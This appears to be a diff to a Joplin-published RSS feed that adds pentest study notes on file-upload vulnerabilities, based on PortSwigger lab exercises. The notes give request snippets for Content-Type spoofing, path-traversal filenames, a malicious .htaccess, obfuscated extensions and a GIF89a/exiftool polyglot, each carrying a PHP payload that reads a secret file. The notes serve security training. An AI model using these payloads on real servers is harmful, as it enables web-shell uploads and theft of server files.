@@ -4,7 +4,7 @@
         <title></title>
         <link>undefined</link>
         <description>undefined</description>
-        <lastBuildDate>Mon, 08 Aug 2022 22:44:05 GMT</lastBuildDate>
+        <lastBuildDate>Mon, 08 Aug 2022 22:44:52 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Joplin Pages Publisher</generator>
         <item>
@@ -43,6 +43,84 @@ Cybersecurity professionals collect information from open sources to :</p>
 <h2 id="wi-fi-osint">Wi-Fi OSINT</h2>
 <h3 id="tinycheck-httpsgithubcomkasperskylabtinycheck"><code>TinyCheck</code> | <a title="https://github.com/KasperskyLab/TinyCheck" href="https://github.com/KasperskyLab/TinyCheck">https://github.com/KasperskyLab/TinyCheck</a></h3>
 <p><em>Easily capture network communications from a smartphone or any device that can be associated with a Wi-Fi access point for quick analysis.</em></p>
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[File Upload]]></title>
+            <guid>77e0f4fdbe7242de9b29550a5176f90e</guid>
+            <pubDate>Sat, 01 Jan 2022 18:33:55 GMT</pubDate>
+            <content:encoded><![CDATA[<h1 id="file-upload-vulnerabilities">File upload vulnerabilities</h1>
+<p>See : <a title="https://null-byte.wonderhowto.com/how-to/bypass-file-upload-restrictions-web-apps-get-shell-0323454/" href="https://null-byte.wonderhowto.com/how-to/bypass-file-upload-restrictions-web-apps-get-shell-0323454/">https://null-byte.wonderhowto.com/how-to/bypass-file-upload-restrictions-web-apps-get-shell-0323454/</a></p>
+<p><img src="/_resources/e629414e29954f6db3a4e3c3411374cb.png" />
+<code>source :</code> <a title="https://portswigger.net/web-security/file-upload" href="https://portswigger.net/web-security/file-upload">https://portswigger.net/web-security/file-upload</a></p>
+<h2 id="web-shell-upload-via-content-type-restriction-bypass">Web shell upload via Content-Type restriction bypass</h2>
+<p>When uploading a php file;</p>
+<div><pre class="hljs"><code><span class="hljs-comment"># Change :</span>
+Content-Type: application/x-php
+<span class="hljs-comment"># to</span>
+Content-Type: image/jpeg</code></pre></div>
+<hr />
+<h2 id="web-shell-upload-via-path-traversal">Web shell upload via path traversal</h2>
+<p>When uploading a php file;
+You can upload the file to a different directory with lesser controls (a different directory that’s not supposed to contain user-supplied files)</p>
+<div><pre class="hljs"><code>Change :
+Content-Disposition: form-data; name=<span class="hljs-string">"avatar"</span>; filename=<span class="hljs-string">"secrets.php"</span>
+to
+Content-Disposition: form-data; name=<span class="hljs-string">"avatar"</span>; filename=<span class="hljs-string">"../secrets.php"</span>
+
+<span class="hljs-comment"># You can encode "../" as :</span>
+    %2e%2e%2f
+    %252e%252e%252f
+    ..%c0%af
+    ..%ef%bc%8f
+Then access the file with LFI;
+GET /files/avatars/../secrets.php</code></pre></div>
+<hr />
+<h2 id="overriding-the-server-configuration">Overriding the server configuration</h2>
+<p>Before uploading a php file;</p>
+<ul>
+<li>Servers also allow developers to create special configuration files within individual directories in order to override or add to one or more of the global settings.</li>
+<li>Apache servers, for example, will load a directory-specific configuration from a file called <strong>.htaccess</strong> if one is present.</li>
+</ul>
+<div><pre class="hljs"><code><span class="hljs-comment"># First, upload a malicious .htaccess</span>
+Content-Disposition: form-data; name=<span class="hljs-string">"avatar"</span>; filename=<span class="hljs-string">".htaccess"</span>
+Content-Type: text/plain
+
+AddType application/x-httpd-php .l33t
+
+<span class="hljs-comment"># Then upload the php file with .l33t extention</span>
+Content-Disposition: form-data; name=<span class="hljs-string">"avatar"</span>; filename=<span class="hljs-string">"secrets.l33t"</span>
+Content-Type: application/x-php
+
+<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">'/home/carlos/secret'</span>); <span class="hljs-meta">?&gt;</span></code></pre></div>
+<hr />
+<h2 id="web-shell-upload-via-obfuscated-file-extension">Web shell upload via obfuscated file extension</h2>
+<ul>
+<li>Provide multiple extensions. Depending on the algorithm used to parse the filename, the following file may be interpreted as either a <strong>PHP</strong> file or <strong>JPG</strong> image: <strong>exploit.php.jpg</strong></li>
+<li>Add trailing characters. Some components will strip or ignore trailing whitespaces, dots, and suchlike: <strong>exploit.php.</strong></li>
+<li>Try using the URL encoding (or double URL encoding) for dots, forward slashes, and backward slashes. If the value isn’t decoded when validating the file extension, but is later decoded server-side, this can also allow you to upload malicious files that would otherwise be blocked: <strong>exploit%2Ephp</strong></li>
+<li>Add semicolons or URL-encoded null byte characters before the file extension. If validation is written in a high-level language like PHP or Java, but the server processes the file using lower-level functions in C/C++, for example, this can cause discrepancies in what is treated as the end of the filename: <strong>exploit.asp;.jpg</strong> or <strong>exploit.asp%00.jpg</strong></li>
+<li>Try using multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization. Sequences like <strong>xC0 x2E, xC4 xAE or xC0 xAE</strong> may be translated to x2E if the filename parsed as a UTF-8 string, but then converted to ASCII characters before being used in a path.</li>
+</ul>
+<hr />
+<h2 id="remote-code-execution-via-polyglot-web-shell-upload">Remote code execution via polyglot web shell upload</h2>
+<p>In order to upload a php file where the file verification is done on the server side (checking if it is really a IMAGE file), we can disguise a php file as an image file;</p>
+<p>When uploading a php file;</p>
+<div><pre class="hljs"><code><span class="hljs-comment"># You can add :</span>
+    - GIF89a <span class="hljs-comment">// at the beginning of the php file or in the burp request</span>
+
+<span class="hljs-comment"># Burp request</span>
+Content-Disposition: form-data; name=<span class="hljs-string">"avatar"</span>; filename=<span class="hljs-string">"secrets.php"</span>
+Content-Type: application/x-php
+
+<span class="hljs-comment"># GIF89a at the beginning of the php command</span>
+GIF89a;<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">'/home/carlos/secret'</span>); <span class="hljs-meta">?&gt;</span></code></pre></div>
+<p><img src="/_resources/884f5b2f02894769bc6ab8afec9042e1.png" /></p>
+<p>or, Generate a polyglot payload using exiftool</p>
+<div><pre class="hljs"><code>exiftool -Comment=<span class="hljs-string">"&lt;?php echo 'START ' . 
+file_get_contents('/home/carlos/secret') . ' END'; ?&gt;"</span> &lt;YOUR-INPUT-IMAGE&gt;.jpg -o polyglot.php</code></pre></div>
+<hr />
+<h2 id="web-shell-upload-via-race-condition">Web shell upload via race condition</h2>
 ]]></content:encoded>
         </item>
         <item>
